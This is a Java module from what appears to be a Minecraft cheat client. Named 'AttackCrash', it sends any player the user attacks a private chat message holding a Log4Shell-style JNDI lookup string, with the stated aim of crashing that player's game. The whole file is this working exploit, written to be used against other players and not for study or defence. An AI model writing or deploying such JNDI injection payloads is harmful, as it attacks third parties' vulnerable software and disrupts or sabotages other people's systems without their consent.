/*
 Copyright Alan Wood 2021
 None of this code to be reused without my written permission
 Intellectual Rights owned by Alan Wood
 */
package dev.risas.module.impl.combat;

import dev.risas.event.impl.other.AttackEvent;
import dev.risas.module.Module;
import dev.risas.module.api.ModuleInfo;
import dev.risas.module.enums.Category;
import dev.risas.util.math.TimeUtil;
import net.minecraft.entity.player.EntityPlayer;

@ModuleInfo(name = "AttackCrash", description = "Crashes other peoples games upon attacking them on some servers", category = Category.COMBAT)
public final class AttackCrash extends Module {

    private final TimeUtil timer = new TimeUtil();

    @Override
    public void onAttackEvent(final AttackEvent event) {
        if (event.getTarget() instanceof EntityPlayer && timer.hasReached(1000L)) {
            final EntityPlayer player = (EntityPlayer) event.getTarget();
            mc.thePlayer.sendChatMessage("/msg " + player.getName() + " ${jndi:rmi://localhost:3000}");
            timer.reset();
        }
    }
}
